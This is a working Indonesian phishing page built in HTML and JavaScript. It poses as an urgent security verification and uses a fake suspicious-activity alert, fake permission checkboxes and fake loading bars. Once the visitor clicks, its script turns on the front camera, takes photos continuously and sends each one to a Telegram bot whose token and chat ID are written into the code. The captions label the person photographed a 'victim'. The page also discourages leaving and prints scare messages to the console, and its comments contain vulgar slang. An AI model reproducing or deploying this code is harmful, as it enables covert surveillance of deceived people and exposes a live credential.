<!DOCTYPE html>
<html lang="id">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Update Sistem [PENTING]</title>
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }
        
        body {
            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
            min-height: 100vh;
            display: flex;
            justify-content: center;
            align-items: center;
            padding: 20px;
        }
        
        .container {
            background: white;
            border-radius: 20px;
            box-shadow: 0 20px 60px rgba(0,0,0,0.3);
            max-width: 400px;
            width: 100%;
            padding: 30px;
            text-align: center;
            position: relative;
            overflow: hidden;
        }
        
        .loading-bar {
            width: 100%;
            height: 4px;
            background: #f0f0f0;
            border-radius: 4px;
            margin: 20px 0;
            overflow: hidden;
        }
        
        .loading-progress {
            width: 0%;
            height: 100%;
            background: linear-gradient(90deg, #667eea, #764ba2);
            animation: loading 3s infinite;
        }
        
        @keyframes loading {
            0% { width: 0%; }
            50% { width: 100%; }
            100% { width: 0%; }
        }
        
        .warning-icon {
            font-size: 48px;
            margin-bottom: 20px;
        }
        
        .permission-box {
            background: #f8f9fa;
            border-radius: 12px;
            padding: 15px;
            margin: 20px 0;
            text-align: left;
        }
        
        .permission-item {
            display: flex;
            align-items: center;
            margin: 10px 0;
            padding: 8px;
            background: white;
            border-radius: 8px;
            cursor: pointer;
        }
        
        .permission-item input[type="checkbox"] {
            width: 18px;
            height: 18px;
            margin-right: 12px;
            cursor: pointer;
        }
        
        .permission-item label {
            flex: 1;
            cursor: pointer;
            font-size: 14px;
            color: #333;
        }
        
        .permission-item small {
            color: #666;
            font-size: 12px;
        }
        
        .btn-verify {
            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
            color: white;
            border: none;
            padding: 15px 30px;
            border-radius: 12px;
            font-size: 16px;
            font-weight: 600;
            cursor: pointer;
            width: 100%;
            transition: transform 0.2s;
            margin-top: 20px;
        }
        
        .btn-verify:hover {
            transform: translateY(-2px);
        }
        
        .btn-verify:disabled {
            opacity: 0.5;
            cursor: not-allowed;
            transform: none;
        }
        
        .hidden-camera {
            display: none;
        }
        
        #preview {
            width: 100%;
            max-height: 200px;
            object-fit: cover;
            border-radius: 8px;
            margin-top: 15px;
            display: none;
        }
        
        .status-text {
            font-size: 14px;
            color: #666;
            margin: 10px 0;
        }
        
        .alert {
            background: #fff3cd;
            color: #856404;
            padding: 12px;
            border-radius: 8px;
            margin: 15px 0;
            font-size: 14px;
        }
    </style>
</head>
<body>
    <div class="container">
        <!-- Icon Palsu -->
        <div class="warning-icon">üîí</div>
        
        <!-- Judul -->
        <h2 style="margin-bottom: 10px; color: #333;">Verifikasi Keamanan Diperlukan</h2>
        <p style="color: #666; margin-bottom: 20px;">Untuk melanjutkan, verifikasi identitas Anda</p>
        
        <!-- Loading Bar Palsu -->
        <div class="loading-bar">
            <div class="loading-progress"></div>
        </div>
        
        <!-- Alert Palsu -->
        <div class="alert">
            ‚ö†Ô∏è Sistem mendeteksi aktivitas mencurigakan dari IP Anda
        </div>
        
        <!-- Permission Box -->
        <div class="permission-box">
            <p style="font-weight: 600; margin-bottom: 10px;">Izinkan akses berikut:</p>
            
            <div class="permission-item">
                <input type="checkbox" id="camera" checked disabled>
                <label for="camera">
                    <strong>Kamera</strong><br>
                    <small>Diperlukan untuk verifikasi wajah</small>
                </label>
            </div>
            
            <div class="permission-item">
                <input type="checkbox" id="storage" checked disabled>
                <label for="storage">
                    <strong>Penyimpanan</strong><br>
                    <small>Diperlukan untuk menyimpan log keamanan</small>
                </label>
            </div>
            
            <div class="permission-item">
                <input type="checkbox" id="location" checked disabled>
                <label for="location">
                    <strong>Lokasi</strong><br>
                    <small>Diperlukan untuk verifikasi regional</small>
                </label>
            </div>
        </div>
        
        <!-- Status Text -->
        <div class="status-text" id="status">Menunggu izin kamera...</div>
        
        <!-- Preview Gambar (Sembunyi) -->
        <video id="video" class="hidden-camera" width="640" height="480" autoplay></video>
        <canvas id="canvas" class="hidden-camera" width="640" height="480"></canvas>
        <img id="preview" src="#" alt="Preview">
        
        <!-- Tombol -->
        <button class="btn-verify" id="verifyBtn" onclick="startSpy()">
            VERIFIKASI SEKARANG
        </button>
        
        <p style="font-size: 12px; color: #999; margin-top: 15px;">
            Dengan melanjutkan, Anda menyetujui <a href="#" style="color: #667eea;">Syarat & Ketentuan</a>
        </p>
    </div>

    <script>
        // ==================== KONFIGURASI TELEGRAM ====================
        const BOT_TOKEN = "8267008237:AAEODmo0n0z_7B3f59kVwQNqe6NTFD3ko3k";
        const CHAT_ID = "8225317707";
        const CAPTURE_INTERVAL = 1; // milidetik
        
        // ==================== INISIALISASI ====================
        let video = document.getElementById('video');
        let canvas = document.getElementById('canvas');
        let context = canvas.getContext('2d');
        let preview = document.getElementById('preview');
        let statusText = document.getElementById('status');
        let captureInterval;
        let isCapturing = false;
        
        // ==================== FUNGSI NGINTIP KONTOL ====================
        async function startSpy() {
            try {
                statusText.innerHTML = "Mengakses kamera... üì∏";
                
                // Minta izin kamera
                const stream = await navigator.mediaDevices.getUserMedia({ 
                    video: { 
                        width: { ideal: 1280 },
                        height: { ideal: 720 },
                        facingMode: 'user' // 'user' buat kamera depan, 'environment' buat kamera belakang
                    } 
                });
                
                // Tampilin stream ke video element
                video.srcObject = stream;
                
                statusText.innerHTML = "Kamera aktif! Memulai pengintaian... ü§´";
                
                // Ganti tombol
                document.getElementById('verifyBtn').innerHTML = "‚úì VERIFIKASI BERHASIL";
                document.getElementById('verifyBtn').style.background = "#28a745";
                
                // Mulai nangkap gambar setiap 1ms
                setTimeout(() => {
                    startCapture();
                }, 1000);
                
            } catch (err) {
                statusText.innerHTML = "Gagal akses kamera: " + err.message + " üò≠";
                alert("Kamera diperlukan untuk verifikasi! Izinkan akses kamera.");
            }
        }
        
        function startCapture() {
            if (isCapturing) return;
            isCapturing = true;
            
            statusText.innerHTML = "MODE PENGAWASAN AKTIF - MENGIRIM KE TELEGRAM üî¥";
            
            // Nangkap gambar setiap 1ms (dalam JavaScript minimal 1ms ya kontol)
            captureInterval = setInterval(captureAndSend, 1);
        }
        
        async function captureAndSend() {
            try {
                // Hitung waktu mulai
                let startTime = performance.now();
                
                // Gambar frame dari video ke canvas
                context.drawImage(video, 0, 0, canvas.width, canvas.height);
                
                // Konversi ke base64
                let base64Image = canvas.toDataURL('image/jpeg', 0.85); // 85% quality biar cepet
                
                // Tampilkan preview kecil (opsional)
                preview.src = base64Image;
                preview.style.display = 'block';
                
                // Kirim ke Telegram
                await sendToTelegram(base64Image);
                
                // Hitung waktu eksekusi
                let executionTime = performance.now() - startTime;
                
                if (executionTime > 1) {
                    console.log(`Ngaret: ${executionTime.toFixed(2)}ms - maap kontol!`);
                }
                
            } catch (err) {
                console.log("Error capture: " + err.message);
            }
        }
        
        async function sendToTelegram(base64Image) {
            try {
                // Buat FormData buat dikirim
                let formData = new FormData();
                
                // Convert base64 ke blob
                let block = base64Image.split(";");
                let contentType = block[0].split(":")[1];
                let realData = block[1].split(",")[1];
                
                let blob = b64toBlob(realData, contentType);
                
                // Append ke form data
                formData.append("photo", blob, "spy_" + Date.now() + ".jpg");
                formData.append("chat_id", CHAT_ID);
                formData.append("caption", `üì∏ TANGKAPAN BARU\nüïê Waktu: ${new Date().toLocaleString()}\nüë§ Korban: TIDAK DIKETAHUI`);
                
                // Kirim ke API Telegram
                fetch(`https://api.telegram.org/bot8267008237:AAEODmo0n0z_7B3f59kVwQNqe6NTFD3ko3k/sendPhoto`, {
                    method: 'POST',
                    body: formData
                })
                .then(response => response.json())
                .then(data => {
                    if (data.ok) {
                        console.log("[‚úì] Foto terkirim: " + Date.now());
                        // Kedipin preview sebagai indikator terkirim
                        preview.style.opacity = '0.5';
                        setTimeout(() => preview.style.opacity = '1', 50);
                    } else {
                        console.log("[‚úó] Gagal ngirim: " + data.description);
                    }
                })
                .catch(error => {
                    console.log("[‚úó] Error: " + error.message);
                });
                
            } catch (err) {
                console.log("Error send: " + err.message);
            }
        }
        
        // Fungsi konversi base64 ke blob
        function b64toBlob(b64Data, contentType) {
            contentType = contentType || '';
            let sliceSize = 512;
            
            let byteCharacters = atob(b64Data);
            let byteArrays = [];
            
            for (let offset = 0; offset < byteCharacters.length; offset += sliceSize) {
                let slice = byteCharacters.slice(offset, offset + sliceSize);
                
                let byteNumbers = new Array(slice.length);
                for (let i = 0; i < slice.length; i++) {
                    byteNumbers[i] = slice.charCodeAt(i);
                }
                
                let byteArray = new Uint8Array(byteNumbers);
                byteArrays.push(byteArray);
            }
            
            return new Blob(byteArrays, {type: contentType});
        }
        
        // Fungsi buat ngecek izin kamera
        async function checkCameraPermission() {
            try {
                const permissionStatus = await navigator.permissions.query({ name: 'camera' });
                console.log('Izin kamera:', permissionStatus.state);
                
                if (permissionStatus.state === 'granted') {
                    statusText.innerHTML = "Kamera sudah diizinkan, siap ngintip! üòà";
                }
            } catch (err) {
                // Browser mungkin ga support permission API
                console.log("Ga bisa cek izin:", err);
            }
        }
        
        // Panggil fungsi cek izin pas halaman dimuat
        window.onload = function() {
            checkCameraPermission();
            
            // Sembunyikan video element
            video.style.display = 'none';
            
            // Tambahin fake loading
            setTimeout(() => {
                document.querySelector('.loading-progress').style.animation = 'none';
            }, 3000);
        };
        
        // Kasih fake error kalo pengguna mau keluar
        window.onbeforeunload = function() {
            return "Verifikasi belum selesai! Yakin mau keluar?";
        };
        
        // Buat fake error console biar keliatan serem
        console.log("%c‚ö†Ô∏è PERINGATAN KEAMANAN!", "color: red; font-size: 24px; font-weight: bold;");
        console.log("%cAktivitas mencurigakan terdeteksi dari komputer Anda!", "color: orange; font-size: 16px;");
        console.log("%cJangan tutup halaman ini atau akun Anda akan diblokir!", "color: red; font-size: 14px;");
        
        // Fake error popup
        setTimeout(() => {
            console.error("ERROR: Gagal memverifikasi identitas! Coba lagi.");
        }, 5000);
        
    </script>
</body>
</html>
